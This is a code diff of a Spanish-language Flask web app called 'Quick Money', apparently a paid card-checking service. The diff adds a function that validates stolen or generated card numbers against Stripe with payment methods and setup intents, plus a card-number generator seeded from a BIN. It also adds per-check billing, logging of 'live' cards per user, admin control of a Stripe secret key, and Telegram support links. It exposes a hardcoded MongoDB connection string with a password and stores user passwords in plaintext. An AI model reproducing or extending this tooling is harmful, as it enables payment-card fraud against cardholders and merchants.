@@ -3,7 +3,7 @@ from flask import Flask, render_template_string, request, redirect, session, url
 from pymongo import MongoClient
 
 app = Flask(__name__)
-app.secret_key = 'quick_money_v50_houdini_mastery'
+app.secret_key = 'quick_money_v49_final_mastery'
 
 # --- [ CONFIGURACIÓN MAESTRA INTACTA ] ---
 MONGO_URI = "mongodb+srv://mairo:mairo1212@cluster0.inuth4k.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
@@ -19,203 +19,256 @@ except Exception as e:
 
 COSTO_LIVE = 0.15
 
-# --- [ DISEÑO v50 ULTIMATE: HOUDINI GHOST EDITION ] ---
-CSS_V50 = """
+# --- [ MOTOR PRO: SETUP INTENT ] ---
+def check_gate_nitro(cc, sk_key):
+    try:
+        partes = cc.split('|')
+        if len(partes) < 4: return {"status": "DEAD", "msg": "FORMATO ERROR"}
+        num, mes, ano, cvv = partes[0], partes[1], partes[2], partes[3]
+        headers = {"Authorization": f"Bearer {sk_key}", "Content-Type": "application/x-www-form-urlencoded"}
+        pm_data = {"type": "card", "card[number]": num, "card[exp_month]": int(mes), "card[exp_year]": int(ano), "card[cvc]": cvv}
+        pm_res = requests.post('https://api.stripe.com/v1/payment_methods', data=pm_data, headers=headers, timeout=10)
+        pm_json = pm_res.json()
+        if "error" in pm_json: return {"status": "DEAD", "msg": pm_json['error'].get('message', 'DECLINED').upper()}
+        si_data = {"payment_method": pm_json['id'], "confirm": "true", "usage": "off_session"}
+        si_res = requests.post('https://api.stripe.com/v1/setup_intents', data=si_data, headers=headers, timeout=10)
+        si_json = si_res.json()
+        if "error" in si_json: return {"status": "DEAD", "msg": si_json['error'].get('decline_code', 'DECLINED').upper()}
+        if si_json.get('status') in ['succeeded', 'requires_action', 'processing']: return {"status": "LIVE", "msg": "AUTHORIZED"}
+        return {"status": "DEAD", "msg": "FAILED_AUTH"}
+    except: return {"status": "DEAD", "msg": "GATE_ERROR"}
+
+# --- [ DISEÑO FINAL SIN HUECOS ] ---
+CSS = """
 <style>
-    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
-    :root { 
-        --green: #00FF41; /* Verde Matrix/Hacker */
-        --white: #FFFFFF;
-        --bg: #000000;
-        --glass: rgba(255, 255, 255, 0.05);
-        --border: rgba(0, 255, 65, 0.2);
-    }
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');
+    :root { --gold: #c5a059; --bg: #000; --card: rgba(12, 12, 15, 0.96); --border: #1e1e24; --green: #2ecc71; --red: #ff4757; }
+    body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono', monospace; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
+    #bg-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; pointer-events: none; opacity: 0.4; }
+    .container { max-width: 1250px; margin: auto; padding: 15px; position: relative; z-index: 10; }
     
-    body { 
-        background-color: var(--bg);
-        color: var(--white);
-        font-family: 'JetBrains Mono', monospace;
-        margin: 0; padding: 0;
-        overflow-x: hidden;
-    }
+    .main-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; align-items: stretch; }
+    @media (max-width: 900px) { .main-grid { grid-template-columns: 1fr; } }
 
-    /* FONDO ANIMADO DE HOUDINI FLOTANDO */
-    #floating-ghost {
-        position: fixed;
-        top: 10%;
-        left: 50%;
-        transform: translateX(-50%);
-        width: 300px;
-        height: 300px;
-        z-index: 1;
-        opacity: 0.15;
-        pointer-events: none;
-        animation: float 6s ease-in-out infinite;
-    }
-
-    @keyframes float {
-        0%, 100% { transform: translate(-50%, 0px); }
-        50% { transform: translate(-50%, -30px); }
-    }
-
-    .container { max-width: 1200px; margin: auto; padding: 20px; position: relative; z-index: 10; }
+    .card { background: var(--card); border: 1px solid var(--border); padding: 20px; margin-bottom: 20px; border-radius: 4px; backdrop-filter: blur(10px); display: flex; flex-direction: column; }
+    .card-h { font-size: 10px; color: var(--gold); text-transform: uppercase; font-weight: bold; border-bottom: 1px solid var(--border); padding-bottom: 8px; margin-bottom: 15px; display: block; letter-spacing: 2px; }
     
-    .card { 
-        background: var(--glass); backdrop-filter: blur(10px); 
-        border: 1px solid var(--border); padding: 20px; margin-bottom: 20px; 
-        border-radius: 4px; box-shadow: 0 0 20px rgba(0,255,65,0.05);
-    }
+    input, textarea { width: 100%; background: #050505; border: 1px solid var(--border); color: #fff; padding: 12px; margin-bottom: 10px; box-sizing: border-box; font-family: inherit; font-size: 13px; outline: none; border-radius: 2px; }
+    .btn { border: none; padding: 12px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 10px; transition: 0.2s; font-family: inherit; border-radius: 2px; text-decoration: none; text-align: center; }
+    .btn-gold { background: var(--gold); color: #000; width: 100%; }
+    .btn-dark { background: #0a0a0a; color: #fff; border: 1px solid #1a1a1e; }
+    .btn-mini { padding: 8px 12px; font-size: 9px; width: auto; }
     
-    .logo-text { color: var(--green); font-size: 24px; font-weight: bold; letter-spacing: 5px; text-align: center; }
-    
-    input, textarea { 
-        width: 100%; background: #000; border: 1px solid var(--border); 
-        color: var(--green); padding: 12px; margin-bottom: 10px; font-family: inherit; 
-        border-radius: 2px; outline: none;
-    }
-
-    .btn-green { 
-        background: var(--green); color: #000; width: 100%; border: none; 
-        padding: 12px; font-weight: bold; text-transform: uppercase; cursor: pointer;
-    }
-    .btn-dark { background: #111; color: var(--white); border: 1px solid var(--border); padding: 8px; cursor: pointer; }
-
-    .res-box { height: 180px; background: #000; border: 1px solid var(--border); padding: 10px; overflow-y: auto; font-size: 11px; border-radius: 2px; }
+    .res-box { border-radius: 2px; padding: 10px; font-size: 11px; min-height: 160px; border: 1px solid #1e1e24; background: #030303; overflow-y: auto; max-height: 300px; }
+    table { width: 100%; font-size: 10px; border-collapse: collapse; }
+    th { text-align: left; color: var(--gold); border-bottom: 1px solid var(--border); padding: 8px 5px; }
+    td { padding: 8px 5px; border-bottom: 1px solid #111; }
+    .flex-row { display: flex; gap: 10px; align-items: center; margin-bottom: 10px; flex-wrap: wrap; }
+    .footer-links { text-align: center; margin: 40px 0; font-size: 10px; position: relative; z-index: 20; }
+    .footer-links a { color: var(--gold); margin: 0 15px; text-decoration: none; opacity: 0.8; }
+    .footer-links a:hover { opacity: 1; }
 </style>
+"""
+
+JS_SCRIPT = """
+<script>
+    const canvas = document.getElementById('bg-canvas'); const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    let particles = [];
+    class Particle {
+        constructor() { this.x = Math.random() * canvas.width; this.y = Math.random() * canvas.height; this.size = Math.random() * 1.5; this.speedX = Math.random() * 0.4 - 0.2; this.speedY = Math.random() * 0.4 - 0.2; this.color = '#c5a059'; }
+        update() { this.x += this.speedX; this.y += this.speedY; if (this.x > canvas.width || this.x < 0) this.speedX *= -1; if (this.y > canvas.height || this.y < 0) this.speedY *= -1; }
+        draw() { ctx.fillStyle = this.color; ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill(); }
+    }
+    function init() { for (let i = 0; i < 80; i++) particles.push(new Particle()); }
+    function animate() { ctx.clearRect(0, 0, canvas.width, canvas.height); for (let i = 0; i < particles.length; i++) { particles[i].update(); particles[i].draw(); } requestAnimationFrame(animate); }
+    init(); animate();
+
+    function generar() {
+        let bin = document.getElementById('bin_val').value; if(bin.length < 6) return;
+        let out = ""; for(let i=0; i<10; i++) {
+            let n = bin; while(n.length < 16) n += Math.floor(Math.random()*10);
+            let m = ["01","02","03","04","05","06","07","08","09","10","11","12"][Math.floor(Math.random()*12)];
+            let y = 2025 + Math.floor(Math.random()*6); let c = Math.floor(Math.random()*899)+100;
+            out += n+"|"+m+"|"+y+"|"+c+"\\n";
+        }
+        document.getElementById('check_list').value = out;
+    }
+    function limpiarGeneradas() { document.getElementById('check_list').value = ""; }
+    function limpiarDead() { document.getElementById('dead_log').innerHTML = ""; }
+    function toggleHistory() {
+        let content = document.getElementById('history-content');
+        content.style.display = (content.style.display === 'block') ? 'none' : 'block';
+    }
+
+    async function startChecking() {
+        let a = document.getElementById('check_list'); let lines = a.value.trim().split('\\n');
+        if(!lines[0]) return; document.getElementById('btn_start').disabled = true;
+        for (let cc of lines) {
+            let r = await fetch('/validar_card', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({card:cc.trim()})});
+            let d = await r.json();
+            if(d.status === 'LIVE') {
+                document.getElementById('display_saldo').innerText = '$' + d.nuevo_saldo.toFixed(2);
+                document.getElementById('lives_log').innerHTML = '<div style="color:var(--green); margin-bottom:5px;">'+cc+' | AUTHORIZED</div>' + document.getElementById('lives_log').innerHTML;
+            } else {
+                document.getElementById('dead_log').innerHTML = '<div>'+cc+' | '+d.msg+'</div>' + document.getElementById('dead_log').innerHTML;
+            }
+        }
+        document.getElementById('btn_start').disabled = false;
+    }
+</script>
 """
 
 @app.route('/panel')
 def panel():
     if 'user' not in session: return redirect(url_for('login'))
     u_data = usuarios_col.find_one({"u": session['user']})
+    display_name = "ADMIN" if session['user'].lower() == "mairo" else session['user'].upper()
     is_admin = session['user'].lower() == "mairo"
-    
     current_sk = config_col.find_one({"key": "sk_live"})
     sk_val = current_sk['val'] if current_sk else ""
     all_users = list(usuarios_col.find()) if is_admin else []
-    
+    query = {} if is_admin else {"usuario": session['user']}
+    historial = list(historial_col.find(query).sort("_id", -1).limit(40))
+
     return render_template_string(f"""
-    <html>
-    <head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS_V50}</head>
-    <body>
-        <div id="floating-ghost">
-            <img src="https://cdn-icons-png.flaticon.com/512/2833/2833757.png" width="100%" style="filter: invert(1) sepia(1) saturate(5) hue-rotate(90deg);">
+    <html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head>
+    <body><canvas id="bg-canvas"></canvas>
+    <div class="container">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+            <div style="font-size:11px;">ID: <b style="color:var(--gold)">{display_name}</b></div>
+            <div style="border:1px solid var(--gold); padding:8px 12px; color:var(--gold); font-size:11px;">BALANCE: <b id="display_saldo">${u_data['saldo']:.2f}</b></div>
         </div>
 
-        <div class="container">
-            <div style="display:flex; justify-content:space-between; margin-bottom:20px;">
-                <h1 class="logo-text">QUICK MONEY v50</h1>
-                <div style="text-align:right; color:var(--green);">
-                    BALANCE: <span id="display_saldo">${u_data['saldo']:.2f}</span>
+        <div class="main-grid">
+            <div style="display:flex; flex-direction:column;">
+                {f'''<div class="card" style="border:1px solid var(--gold);"><span class="card-h">👑 ADMIN NITRO CONTROL</span>
+                    <form action="/update_sk" method="POST" class="flex-row">
+                        <input name="new_sk" placeholder="SK_LIVE_..." value="{sk_val}" style="margin-bottom:0; flex:1;">
+                        <button class="btn btn-gold btn-mini">ACTUALIZAR</button>
+                    </form>
+                    <hr style="border:0; border-top:1px solid #1a1a1e; margin:15px 0;">
+                    <form action="/admin_add_saldo" method="POST" class="flex-row">
+                        <input name="target_user" placeholder="USER" style="margin-bottom:0; flex:1;">
+                        <input name="amount" type="number" step="0.01" placeholder="$" style="margin-bottom:0; width:70px;">
+                        <button class="btn btn-gold btn-mini">CARGAR</button>
+                    </form>
+                    <br><span class="card-h">CLIENTES REGISTRADOS</span>
+                    <div style="max-height: 180px; overflow-y: auto;">
+                    <table><tr><th>USUARIO</th><th>TG</th><th>SALDO</th></tr>
+                    {''.join([f"<tr><td>{u['u']}</td><td>{u.get('telegram','-')}</td><td style='color:var(--gold)'>${u['saldo']:.2f}</td></tr>" for u in all_users])}
+                    </table></div>
                 </div>
-            </div>
-
-            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:20px;">
-                <div class="card">
-                    {f'''<span style="color:var(--green); font-size:10px;">👑 ADMIN CONTROL</span><br><br>
-                    <input id="new_sk" placeholder="SK_LIVE_..." value="{sk_val}">
-                    <button class="btn-green" onclick="updateSK()" style="font-size:10px;">ACTUALIZAR MOTOR</button>
-                    ''' if is_admin else '<span>USER PANEL ACTIVE</span>'}
-                    
-                    <br><br><span style="color:var(--white); font-size:10px;">⚡ GENERADOR</span>
-                    <div style="display:flex; gap:10px; margin-top:10px;">
-                        <input id="bin_val" value="473702" style="margin-bottom:0;">
-                        <button class="btn-dark" onclick="generar()">GENERAR</button>
+                <div class="card" style="flex-grow:1;"><span class="card-h">📂 GLOBAL DATABASE (ADMIN)</span>
+                    <button class="btn btn-gold btn-mini" onclick="toggleHistory()" style="width:100%;">TOGGLE DATABASE VIEW</button>
+                    <div id="history-content" style="display:none; margin-top:15px;">
+                        <div style="max-height: 250px; overflow-y: auto;">
+                        <table><tr><th>USER</th><th>CARD</th></tr>
+                        {''.join([f"<tr><td>{h['usuario']}</td><td>{h['cc']}</td></tr>" for h in historial])}
+                        </table></div>
+                    </div>
+                </div>''' if is_admin else f'''
+                <div class="card" style="height:100%;"><span class="card-h">👤 PANEL DE USUARIO</span>
+                    <div style="margin-bottom:20px;">
+                        <div style="font-size:11px; margin-bottom:5px;">Status: <b style="color:var(--green)">Premium Account</b></div>
+                        <div style="font-size:11px; margin-bottom:20px;">Telegram: <b style="color:var(--gold)">{u_data.get('telegram','-')}</b></div>
+                        <p style="font-size:11px; opacity:0.8; line-height:1.6;">Ajustes de cuenta y acceso al historial de validaciones en vivo.</p>
+                    </div>
+                    <button class="btn btn-gold btn-mini" style="width:100%;" onclick="toggleHistory()">📂 VER HISTORIAL DE LIVES</button>
+                    <div id="history-content" style="display:none; margin-top:20px; border-top: 1px solid var(--border); padding-top:15px;">
+                        <div style="max-height: 300px; overflow-y: auto; background: #050505; padding:5px;">
+                            <table><tr><th>CARD</th><th>FECHA</th></tr>
+                            {''.join([f"<tr><td>{h['cc']}</td><td>{h['fecha']}</td></tr>" for h in historial])}
+                            </table>
+                        </div>
+                    </div>
+                    <div style="margin-top:auto; padding-top:20px;">
+                        <a href="https://t.me/quickmoney_support24" target="_blank" class="btn btn-dark btn-mini" style="width:100%; text-decoration:none;">SOLICITAR SOPORTE</a>
                     </div>
                 </div>
-
-                <div class="card">
-                    <span style="color:var(--green); font-size:10px;">🔮 CHECKER</span><br><br>
-                    <textarea id="check_list" rows="8" placeholder="CC|MM|YY|CVV"></textarea>
-                    <button class="btn-green" id="btn_start" onclick="startChecking()">EJECUTAR HECHIZO ($0.15)</button>
-                </div>
+                '''}
             </div>
 
-            <div style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:15px; margin-top:20px;">
-                <div>
-                    <span style="color:var(--green); font-size:10px;">LIVES ✅</span>
-                    <div id="lives_log" class="res-box" style="border-color: var(--green);"></div>
+            <div class="card"><span class="card-h">🪄 GENERADOR / CHECKER</span>
+                <div class="flex-row">
+                    <input id="bin_val" value="473702" style="margin-bottom:0; flex:1;">
+                    <button class="btn btn-dark btn-mini" onclick="generar()">GENERAR</button>
+                    <button class="btn btn-dark btn-mini" style="color:var(--red)" onclick="limpiarGeneradas()">BORRAR</button>
                 </div>
-                <div>
-                    <span style="color:var(--white); font-size:10px;">DEADS ❌</span>
-                    <div id="dead_log" class="res-box" style="opacity:0.5;"></div>
-                </div>
-                <div>
-                    <span style="color:#FFCC00; font-size:10px;">⚠️ ERRORES</span>
-                    <div id="error_log" class="res-box" style="border-color: #FFCC00; color: #FFCC00;"></div>
-                </div>
+                <textarea id="check_list" rows="11" placeholder="CC|MM|YY|CVV"></textarea>
+                <button class="btn btn-gold" id="btn_start" onclick="startChecking()" style="width:100%;">🚀 INICIAR PROCESO ($0.15)</button>
             </div>
-            
-            <div style="text-align:center; margin-top:20px;"><a href="/logout" style="color:red; font-size:10px; text-decoration:none;">DISCONNECT</a></div>
         </div>
 
-        <script>
-            function generar() {{
-                let bin = document.getElementById('bin_val').value;
-                let out = "";
-                for(let i=0; i<10; i++) {{
-                    let n = bin; while(n.length < 16) n += Math.floor(Math.random()*10);
-                    let m = String(Math.floor(Math.random()*12)+1).padStart(2,'0');
-                    let y = 2025 + Math.floor(Math.random()*6);
-                    let c = Math.floor(Math.random()*899)+100;
-                    out += n+"|"+m+"|"+y+"|"+c+"\\n";
-                }}
-                document.getElementById('check_list').value = out;
-            }}
+        <div class="main-grid" style="margin-top:0;">
+            <div><span style="color:var(--green); font-size:10px; margin-bottom:5px; display:block;">LIVES ✅</span><div class="res-box" id="lives_log"></div></div>
+            <div>
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+                    <span style="color:var(--red); font-size:10px;">DEAD ❌</span>
+                    <button class="btn btn-dark btn-mini" onclick="limpiarDead()">BORRAR DEAD</button>
+                </div>
+                <div class="res-box" id="dead_log" style="opacity:0.6;"></div>
+            </div>
+        </div>
 
-            async function startChecking() {{
-                let lines = document.getElementById('check_list').value.trim().split('\\n');
-                if(!lines[0]) return;
-                document.getElementById('btn_start').disabled = true;
-
-                for (let cc of lines) {{
-                    try {{
-                        let r = await fetch('/validar_card', {{
-                            method:'POST', 
-                            headers:{{'Content-Type':'application/json'}}, 
-                            body:JSON.stringify({{card:cc.trim()}})
-                        }});
-                        let d = await r.json();
-                        
-                        if(d.status === 'LIVE') {{
-                            document.getElementById('lives_log').innerHTML = '<div>'+cc+'</div>' + document.getElementById('lives_log').innerHTML;
-                            document.getElementById('display_saldo').innerText = '$' + d.nuevo_saldo.toFixed(2);
-                        }} else if(d.msg.includes('ERROR') || d.msg.includes('SK')) {{
-                            document.getElementById('error_log').innerHTML = '<div>'+cc+' | '+d.msg+'</div>' + document.getElementById('error_log').innerHTML;
-                        }} else {{
-                            document.getElementById('dead_log').innerHTML = '<div>'+cc+'</div>' + document.getElementById('dead_log').innerHTML;
-                        }}
-                    }} catch(e) {{
-                        document.getElementById('error_log').innerHTML = '<div>SYSTEM TIMEOUT</div>' + document.getElementById('error_log').innerHTML;
-                    }}
-                }}
-                document.getElementById('btn_start').disabled = false;
-            }}
-        </script>
-    </body>
-    </html>
+        <div class="footer-links">
+            <a href="https://t.me/quickmoney_support24" target="_blank">🔵 SOPORTE</a> | 
+            <a href="https://t.me/+GUlp9rhO0_k1ZWYx" target="_blank">🔵 GRUPO</a> | 
+            <a href="/logout">🚪 CERRAR SESIÓN</a>
+        </div>
+    </div>
+    {JS_SCRIPT}
+    </body></html>
     """)
 
-# --- [ EL RESTO DE TUS RUTAS REGISTRO/AUTH/ADMIN SIGUEN IGUAL ] ---
+# --- [ LOGIN / REGISTRO / AUTH ] ---
 @app.route('/')
 def login():
-    return render_template_string(f'<html><head>{CSS_V50}</head><body><div style="display:flex; align-items:center; justify-content:center; height:100vh;"><div class="card" style="width:300px; text-align:center;"><h1 class="logo-text">QM v50</h1><form method="POST" action="/auth"><input name="u" placeholder="USER"><input type="password" name="p" placeholder="PASS"><button class="btn-green">ENTER</button></form></div></div></body></html>')
+    if 'user' in session: return redirect(url_for('panel'))
+    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body><canvas id="bg-canvas"></canvas><div style="display:flex;align-items:center;justify-content:center;height:100vh;"><div class="card" style="width:320px; text-align:center; position:relative; z-index:10;"><h2>⚡️🌩️Quick Money🌩️⚡️</h2><br><form method="POST" action="/auth"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><button class="btn btn-gold" style="width:100%;">INGRESAR</button></form><br><a href="/register" style="color:var(--gold); font-size:10px; text-decoration:none;">¿Aun no te a registrado? Regístrate aquí</a></div></div>{JS_SCRIPT}</body></html>')
+
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    if request.method == 'POST':
+        u, p, t = request.form.get('u'), request.form.get('p'), request.form.get('t')
+        if not usuarios_col.find_one({"u": u}):
+            usuarios_col.insert_one({"u": u, "p": p, "saldo": 0.0, "rango": "USER", "telegram": t})
+            return redirect(url_for('login'))
+    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body><canvas id="bg-canvas"></canvas><div style="display:flex;align-items:center;justify-content:center;height:100vh;"><div class="card" style="width:320px; text-align:center; position:relative; z-index:10;"><h2>REGISTRO</h2><form method="POST"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><input name="t" placeholder="TELEGRAM @ID"><button class="btn btn-gold" style="width:100%;">REGISTRARSE</button></form></div></div>{JS_SCRIPT}</body></html>')
 
 @app.route('/validar_card', methods=['POST'])
 def validar():
     u_data = usuarios_col.find_one({"u": session['user']})
     if u_data['saldo'] < COSTO_LIVE: return jsonify({"status":"DEAD", "msg": "SIN SALDO"})
+    sk_data = config_col.find_one({"key": "sk_live"})
+    if not sk_data: return jsonify({"status":"DEAD", "msg": "SK NO CONFIG"})
     cc = request.json.get('card', '')
-    # Por ahora simula live para que pruebes el diseño
-    new_s = round(u_data['saldo'] - COSTO_LIVE, 2)
-    usuarios_col.update_one({"u": session['user']}, {"$set": {"saldo": new_s}})
-    return jsonify({"status": "LIVE", "nuevo_saldo": new_s})
+    res = check_gate_nitro(cc, sk_data['val'])
+    if res['status'] == 'LIVE':
+        new_s = round(u_data['saldo'] - COSTO_LIVE, 2)
+        usuarios_col.update_one({"u": session['user']}, {"$set": {"saldo": new_s}})
+        fecha = datetime.datetime.now().strftime("%d/%m %H:%M")
+        historial_col.insert_one({"usuario": session['user'], "cc": cc, "fecha": fecha})
+        return jsonify({"status": "LIVE", "nuevo_saldo": new_s})
+    return jsonify({"status": "DEAD", "msg": res['msg']})
 
 @app.route('/auth', methods=['POST'])
 def auth():
     u, p = request.form.get('u'), request.form.get('p')
     user_db = usuarios_col.find_one({"u": u, "p": p})
     if user_db: session['user'] = u
+    return redirect(url_for('panel'))
+
+@app.route('/update_sk', methods=['POST'])
+def update_sk():
+    if session.get('user', '').lower() != "mairo": return redirect(url_for('panel'))
+    config_col.update_one({"key": "sk_live"}, {"$set": {"val": request.form.get('new_sk').strip()}}, upsert=True)
+    return redirect(url_for('panel'))
+
+@app.route('/admin_add_saldo', methods=['POST'])
+def admin_add_saldo():
+    if session.get('user', '').lower() != "mairo": return redirect(url_for('panel'))
+    usuarios_col.update_one({"u": request.form.get('target_user')}, {"$inc": {"saldo": float(request.form.get('amount'))}})
     return redirect(url_for('panel'))
 
 @app.route('/logout')
